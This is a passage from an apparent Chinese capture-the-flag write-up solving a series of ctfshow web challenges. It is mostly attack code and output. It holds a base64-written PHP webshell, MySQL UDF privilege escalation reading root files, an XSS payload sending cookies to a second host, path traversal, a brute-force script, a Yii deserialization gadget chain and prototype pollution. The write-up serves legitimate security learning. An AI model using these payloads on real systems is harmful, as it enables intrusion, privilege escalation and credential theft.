class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;key_is_here_you_know&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">sess.post(url+<span class="string">&quot;a.php&quot;</span>,data=data3)</span><br><span class="line">sess.post(url+<span class="string">&quot;a.php&quot;</span>,data=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;`mysql -uroot -proot -e &quot;create function sys_eval returns string soname \&#x27;udf.so\&#x27;&quot;`;&#x27;</span>&#125;)</span><br><span class="line">cmd=<span class="string">&#x27;&#x27;&#x27;mysql -uroot -proot -e &quot;select sys_eval(&#x27;sudo cat /root/you_win&#x27;)&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line">cmd=base64.b64encode(cmd.encode()).decode()</span><br><span class="line">datax=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;echo `echo &#123;0&#125;|base64 -d|sh`;&#x27;</span>.<span class="built_in">format</span>(cmd)&#125;</span><br><span class="line">r1=sess.post(url+<span class="string">&quot;a.php&quot;</span>,data=datax)</span><br><span class="line"><span class="built_in">print</span>(r1.text)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">curl http://172.2.95.5/robots.txt</span><br><span class="line"></span><br><span class="line">curl http://172.2.95.5/public/</span><br><span class="line"></span><br><span class="line">&lt;head&gt;&lt;title&gt;Index of /public/&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Index of /public/&lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a href=&quot;../&quot;&gt;../&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;Readme.txt&quot;&gt;Readme.txt&lt;/a&gt;                                         07-Aug-2021 19:51                 123</span><br><span class="line">&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">curl http://172.2.95.5/public/Readme.txt</span><br><span class="line">没有flag继续</span><br><span class="line"></span><br><span class="line">curl http://172.2.95.5/public../</span><br><span class="line"></span><br><span class="line">&lt;head&gt;&lt;title&gt;Index of /public../&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Index of /public../&lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a href=&quot;../&quot;&gt;../&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;FLAG/&quot;&gt;FLAG/&lt;/a&gt;                                              07-Aug-2021 19:51                   -</span><br><span class="line">&lt;a href=&quot;bin/&quot;&gt;bin/&lt;/a&gt;                                               07-Aug-2021 19:51                   -</span><br><span class="line">&lt;a href=&quot;dev/&quot;&gt;dev/&lt;/a&gt;                                               24-Sep-2024 08:35                   -</span><br><span class="line">&lt;a href=&quot;etc/&quot;&gt;etc/&lt;/a&gt;                                               24-Sep-2024 08:35                   -</span><br><span class="line">&lt;a href=&quot;home/&quot;&gt;home/&lt;/a&gt;                                              07-Aug-2021 19:51                   -</span><br><span class="line">&lt;a href=&quot;lib/&quot;&gt;lib/&lt;/a&gt;                                               22-Sep-2020 08:25                   -</span><br><span class="line">&lt;a href=&quot;media/&quot;&gt;media/&lt;/a&gt;                                             29-May-2020 14:20                   -</span><br><span class="line">&lt;a href=&quot;mnt/&quot;&gt;mnt/&lt;/a&gt;                                               29-May-2020 14:20                   -</span><br><span class="line">&lt;a href=&quot;opt/&quot;&gt;opt/&lt;/a&gt;                                               29-May-2020 14:20                   -</span><br><span class="line">&lt;a href=&quot;proc/&quot;&gt;proc/&lt;/a&gt;                                              24-Sep-2024 08:35                   -</span><br><span class="line">&lt;a href=&quot;public/&quot;&gt;public/&lt;/a&gt;                                            07-Aug-2021 19:51                   -</span><br><span class="line">&lt;a href=&quot;root/&quot;&gt;root/&lt;/a&gt;                                              07-Aug-2021 19:51                   -</span><br><span class="line">&lt;a href=&quot;run/&quot;&gt;run/&lt;/a&gt;                                               07-Aug-2021 19:51                   -</span><br><span class="line">&lt;a href=&quot;sbin/&quot;&gt;sbin/&lt;/a&gt;                                              22-Sep-2020 08:25                   -</span><br><span class="line">&lt;a href=&quot;srv/&quot;&gt;srv/&lt;/a&gt;                                               29-May-2020 14:20                   -</span><br><span class="line">&lt;a href=&quot;sys/&quot;&gt;sys/&lt;/a&gt;                                               24-Sep-2024 08:35                   -</span><br><span class="line">&lt;a href=&quot;tmp/&quot;&gt;tmp/&lt;/a&gt;                                               24-Sep-2024 08:40                   -</span><br><span class="line">&lt;a href=&quot;usr/&quot;&gt;usr/&lt;/a&gt;                                               07-Aug-2021 19:51                   -</span><br><span class="line">&lt;a href=&quot;var/&quot;&gt;var/&lt;/a&gt;                                               07-Aug-2021 19:51                   -</span><br><span class="line">&lt;a href=&quot;FLAG665&quot;&gt;FLAG665&lt;/a&gt;                                            07-Aug-2021 19:51                  51</span><br><span class="line">&lt;a href=&quot;getflag&quot;&gt;getflag&lt;/a&gt;                                            07-Aug-2021 19:51               19912</span><br><span class="line">&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://172.2.95.5/public../FLAG/</span><br><span class="line"></span><br><span class="line">curl http://172.2.95.5/public../FLAG/flag659.txt</span><br></pre></td></tr></table></figure>

<h1 id="web665"><a href="#web665" class="headerlink" title="web665"></a>web665</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://172.2.95.5/public../FLAG665</span><br></pre></td></tr></table></figure>

<h1 id="web660"><a href="#web660" class="headerlink" title="web660"></a>web660</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">	<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;数据获取失败&#x27;</span>,</span><br><span class="line">	);</span><br><span class="line">	<span class="variable">$u</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$u</span>);</span><br><span class="line">	<span class="variable">$p</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$p</span>);</span><br><span class="line">	<span class="variable">$res</span> = db::<span class="title function_ invoke__">query</span>(<span class="string">&quot;select username from ctfshow_users where username = &#x27;<span class="subst">$u</span>&#x27; and password = &#x27;<span class="subst">$p</span>&#x27;&quot;</span>);</span><br><span class="line">	<span class="variable">$date</span> = <span class="keyword">new</span> <span class="title class_">DateTime</span>(<span class="string">&#x27;now&#x27;</span>);</span><br><span class="line">	<span class="variable">$now</span> = <span class="variable">$date</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">	<span class="variable">$ip</span> = <span class="title function_ invoke__">addslashes</span>(<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]));</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$res</span>)==<span class="number">0</span>)&#123;</span><br><span class="line"> 		 db::<span class="title function_ invoke__">insert</span>(<span class="string">&quot;insert into `ctfshow_logs` (`username`,`login_time`,`login_ip`) values (&#x27;<span class="subst">$u</span>&#x27;,&#x27;<span class="subst">$now</span>&#x27;,&#x27;<span class="subst">$ip</span>&#x27;)&quot;</span>);</span><br><span class="line">		 <span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;账号或密码错误&#x27;</span>;</span><br><span class="line">		 <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">auth</span>())&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;AuthKey 错误&#x27;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="literal">true</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;flag_660&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会存储<code>flag</code>那么是可以直接从日志里面拿到的，这个姿势牛</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://172.2.95.5/public../var/log/nginx/ctfshow_web_error_log_file_you_never_know.log</span><br><span class="line">没读到在报错日志里面</span><br><span class="line">curl http://172.2.95.5/public../var/log/nginx/ctfshow_web_access_log_file_you_never_know.log</span><br></pre></td></tr></table></figure>

<h1 id="web661"><a href="#web661" class="headerlink" title="web661"></a>web661</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl http://172.2.95.5/public../</span><br><span class="line">继续找</span><br><span class="line">curl http://172.2.95.5/public../home/</span><br><span class="line">curl http://172.2.95.5/public../home/flag/</span><br><span class="line">curl http://172.2.95.5/public../home/flag/secret.txt</span><br></pre></td></tr></table></figure>

<h1 id="web662"><a href="#web662" class="headerlink" title="web662"></a>web662</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl http://172.2.95.5/public../home/www-data/creater.sh</span><br><span class="line"></span><br><span class="line">#!/bin/sh</span><br><span class="line">file=`echo $RANDOM|md5sum|cut -c 1-3`.html</span><br><span class="line">100   105  100   105    0     0   4565      0 --:--:-- --:--:-- --:--:--  4565</span><br><span class="line">echo &#x27;flag_663=ctfshow&#123;xxxx&#125;&#x27; &gt; /var/www/html/$file</span><br></pre></td></tr></table></figure>

<p>得了又要爆破,先拿<code>cookie</code>先</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&#x27;dmFyIGltZyA9IG5ldyBJbWFnZSgpOwppbWcuc3JjID0gImh0dHA6Ly8xNzIuMi45NS40L3hzcy5waHA/MT0iK2RvY3VtZW50LmNvb2tpZTsKZG9jdW1lbnQuYm9keS5hcHBlbmQoaW1nKTs=&#x27;</span>|base64 -d &gt; xss.js</span><br><span class="line"></span><br><span class="line">select sys_eval(<span class="string">&#x27;sudo curl -i -H &quot;X-Forwarded-For:&lt;script&gt;document.location=\&#x27;http://172.2.95.4/xss.php?cookie=\&#x27;%2bdocument.cookie;&lt;/script&gt;&quot;  http://172.2.95.5/index.php?action=login&#x27;</span>);</span><br><span class="line"></span><br><span class="line">(www-data:/var/www/html) $ cat cookie.txt</span><br><span class="line">PHPSESSID=kbeu3lvncloob1eqcg5plpvp5e; auth=ZmxhZ182NTY9Y3Rmc2hvd3tlMGI4MGQ2Yjk5ZDJiZGJhZTM2ZjEyMWY3OGFiZTk2Yn0=</span><br></pre></td></tr></table></figure>

<p>然后写个脚本爆破前三位字符，再像之前一样写个马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==&#x27;|base64 -d &gt; /var/www/html/a.php</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://6ad980c6-186e-493f-8373-63593e72a9b6.challenge.ctf.show/a.php&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;kbeu3lvncloob1eqcg5plpvp5e&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">list</span>=<span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"><span class="keyword">while</span>(flag==<span class="number">0</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">                    data = &#123;<span class="string">&quot;1&quot;</span>: <span class="string">&quot;echo `curl http://172.2.95.5:80/&quot;</span> + <span class="built_in">str</span>(i) + <span class="built_in">str</span>(j) + <span class="built_in">str</span>(k) + <span class="string">&quot;.html`;&quot;</span>&#125;</span><br><span class="line">                    r = session.post(url, cookies=cookies, data=data)</span><br><span class="line">                    <span class="built_in">print</span>(r.text)</span><br><span class="line">                    <span class="keyword">if</span> (<span class="string">&#x27;404&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;http://172.2.95.5:80/&quot;</span> + <span class="built_in">str</span>(i) + <span class="built_in">str</span>(j) + <span class="built_in">str</span>(k) + <span class="string">&quot;.html&quot;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(r.text)</span><br><span class="line">                        exit()</span><br></pre></td></tr></table></figure>

<h1 id="web663"><a href="#web663" class="headerlink" title="web663"></a>web663</h1><p>和web662的flag是一样的</p>
<p>回头去<code>phpinfo</code>里面找拓展</p>
<p><img src="/../images/achieves/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ20240924-172640.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://6ad980c6-186e-493f-8373-63593e72a9b6.challenge.ctf.show/a.php</span><br><span class="line"></span><br><span class="line">1=echo+`curl+&#x27;http://172.2.95.5/phpinfo.php&#x27;`;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://172.2.95.5/public../usr/local/lib/php/extensions/no-debug-non-zts-20180731/</span><br><span class="line"></span><br><span class="line">curl http://172.2.95.5/public../usr/local/lib/php/extensions/no-debug-non-zts-20180731/ctfshow.so -o 1.so</span><br></pre></td></tr></table></figure>

<p>然后在so文件里面找到663的<code>flag</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings 1.so | grep -i flag</span><br></pre></td></tr></table></figure>

<h1 id="web664"><a href="#web664" class="headerlink" title="web664"></a>web664</h1><p>回去看<code>nginx</code>服务器配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://172.2.95.5/public../etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">listen       8888;</span><br><span class="line">        server_name  oa;</span><br><span class="line">        root         /var/oa/web;</span><br><span class="line">        index index.php;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br></pre></td></tr></table></figure>

<p>那么去看看<code>8888</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=echo+`curl+&#x27;http://172.2.95.5:8888&#x27;`;</span><br></pre></td></tr></table></figure>

<p>发现是Yii框架，打一个序列化</p>
<p><a target="_blank" rel="noopener" href="http://yiiframework.com/">Yii Framework</a>&#x2F;<a target="_blank" rel="noopener" href="http://github.com/yiisoft/yii2/">2.0.43-dev</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=echo+`curl &quot;http://172.2.95.5:8888/index.php?r=site%2Funserialize%26key=flag_663=ctfshow\&#123;fa5cc1fb0bfc986d1ef150269c0de197\&#125;&quot; -d &quot;UnserializeForm[ctfshowUnserializeData]=O%253A32%253A%2522Codeception%255CExtension%255CRunProcess%2522%253A2%253A%257Bs%253A9%253A%2522%2500%252A%2500output%2522%253BO%253A22%253A%2522Faker%255CDefaultGenerator%2522%253A1%253A%257Bs%253A10%253A%2522%2500%252A%2500default%2522%253Bs%253A5%253A%2522jiang%2522%253B%257Ds%253A43%253A%2522%2500Codeception%255CExtension%255CRunProcess%2500processes%2522%253Ba%253A1%253A%257Bi%253A0%253BO%253A22%253A%2522Faker%255CDefaultGenerator%2522%253A1%253A%257Bs%253A10%253A%2522%2500%252A%2500default%2522%253BO%253A28%253A%2522GuzzleHttp%255CPsr7%255CAppendStream%2522%253A2%253A%257Bs%253A37%253A%2522%2500GuzzleHttp%255CPsr7%255CAppendStream%2500streams%2522%253Ba%253A1%253A%257Bi%253A0%253BO%253A29%253A%2522GuzzleHttp%255CPsr7%255CCachingStream%2522%253A2%253A%257Bs%253A43%253A%2522%2500GuzzleHttp%255CPsr7%255CCachingStream%2500remoteStream%2522%253BO%253A22%253A%2522Faker%255CDefaultGenerator%2522%253A1%253A%257Bs%253A10%253A%2522%2500%252A%2500default%2522%253Bb%253A0%253B%257Ds%253A6%253A%2522stream%2522%253BO%253A26%253A%2522GuzzleHttp%255CPsr7%255CPumpStream%2522%253A3%253A%257Bs%253A34%253A%2522%2500GuzzleHttp%255CPsr7%255CPumpStream%2500source%2522%253BC%253A32%253A%2522Opis%255CClosure%255CSerializableClosure%2522%253A212%253A%257Ba%253A5%253A%257Bs%253A3%253A%2522use%2522%253Ba%253A0%253A%257B%257Ds%253A8%253A%2522function%2522%253Bs%253A57%253A%2522function%2528%2529%257B%255Chighlight_file%2528%2527%252Fvar%252Foa%252Fflag664.php%2527%2529%253Bdie%2528%2529%253B%257D%2522%253Bs%253A5%253A%2522scope%2522%253Bs%253A26%253A%2522GuzzleHttp%255CPsr7%255CPumpStream%2522%253Bs%253A4%253A%2522this%2522%253BN%253Bs%253A4%253A%2522self%2522%253Bs%253A32%253A%2522000000002ae55f4e00000000747d2f8c%2522%253B%257D%257Ds%253A32%253A%2522%2500GuzzleHttp%255CPsr7%255CPumpStream%2500size%2522%253Bi%253A-10%253Bs%253A34%253A%2522%2500GuzzleHttp%255CPsr7%255CPumpStream%2500buffer%2522%253BO%253A22%253A%2522Faker%255CDefaultGenerator%2522%253A1%253A%257Bs%253A10%253A%2522%2500%252A%2500default%2522%253Bs%253A1%253A%2522j%2522%253B%257D%257D%257D%257Ds%253A38%253A%2522%2500GuzzleHttp%255CPsr7%255CAppendStream%2500seekable%2522%253Bb%253A1%253B%257D%257D%257D%257D&quot;`;</span><br></pre></td></tr></table></figure>

<h1 id="web665-1"><a href="#web665-1" class="headerlink" title="web665"></a>web665</h1><p>这个之前就读到了</p>
<h1 id="web666"><a href="#web666" class="headerlink" title="web666"></a>web666</h1><p>从内网的数据库里面读取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$conn = new mysqli(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;ctfshow&#x27;);</span><br><span class="line">$res = $conn-&gt;query(&quot;select * from ctfshow_secret&quot;);</span><br><span class="line">if($res)&#123;</span><br><span class="line">   $row=$res-&gt;fetch_array(MYSQLI_BOTH);</span><br><span class="line">&#125;</span><br><span class="line">echo $row[0];</span><br><span class="line">$conn-&gt;close();</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;MT0kY29ubiA9IG5ldyBteXNxbGkoJ2xvY2FsaG9zdCcsJ3Jvb3QnLCdyb290JywnY3Rmc2hvdycpOwokcmVzID0gJGNvbm4tPnF1ZXJ5KCJzZWxlY3QgKiBmcm9tIGN0ZnNob3dfc2VjcmV0Iik7CmlmKCRyZXMpewogICAkcm93PSRyZXMtPmZldGNoX2FycmF5KE1ZU1FMSV9CT1RIKTsKfQplY2hvICRyb3dbMF07CiRjb25uLT5jbG9zZSgpOw==&#x27;|base64 -d &gt; /tmp/1.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=echo `curl -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -X POST -d @/tmp/1.txt &quot;http://172.2.95.5:8888/assets/shell.php&quot;`;</span><br></pre></td></tr></table></figure>

<h1 id="web667"><a href="#web667" class="headerlink" title="web667"></a>web667</h1><p>扫描一下端口</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">65535</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line">  <span class="variable">$t</span>=<span class="title function_ invoke__">stream_socket_server</span>(<span class="string">&quot;tcp://0.0.0.0:&quot;</span>.<span class="variable">$i</span>,<span class="variable">$ee</span>,<span class="variable">$ee2</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$ee2</span> === <span class="string">&quot;Address already in use&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;PD9waHAKaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pOwpmb3IoJGk9MDskaTw2NTUzNTskaSsrKSB7CiAgJHQ9c3RyZWFtX3NvY2tldF9zZXJ2ZXIoInRjcDovLzAuMC4wLjA6Ii4kaSwkZWUsJGVlMik7CiAgaWYoJGVlMiA9PT0gIkFkZHJlc3MgYWxyZWFkeSBpbiB1c2UiKSB7CiAgICB2YXJfZHVtcCgkaSk7CiAgfQp9&#x27;|base64 -d &gt; 1.php</span><br><span class="line"></span><br><span class="line">chmod 777 1.php</span><br></pre></td></tr></table></figure>

<p>扫出来是3000</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=echo+`curl+&#x27;http://172.2.95.5:3000&#x27;`;</span><br></pre></td></tr></table></figure>

<h1 id="web668"><a href="#web668" class="headerlink" title="web668"></a>web668</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/login</span><br><span class="line"></span><br><span class="line">utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>原型链污染</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> querystring = <span class="built_in">require</span>(<span class="string">&#x27;querystring&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> postHTML = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">http.<span class="title function_">createServer</span>(<span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> body = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  req.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">function</span> (<span class="params">chunk</span>) &#123;</span><br><span class="line">    body += chunk;</span><br><span class="line">  &#125;);</span><br><span class="line">  req.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    body = querystring.<span class="title function_">parse</span>(body);</span><br><span class="line">    res.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span 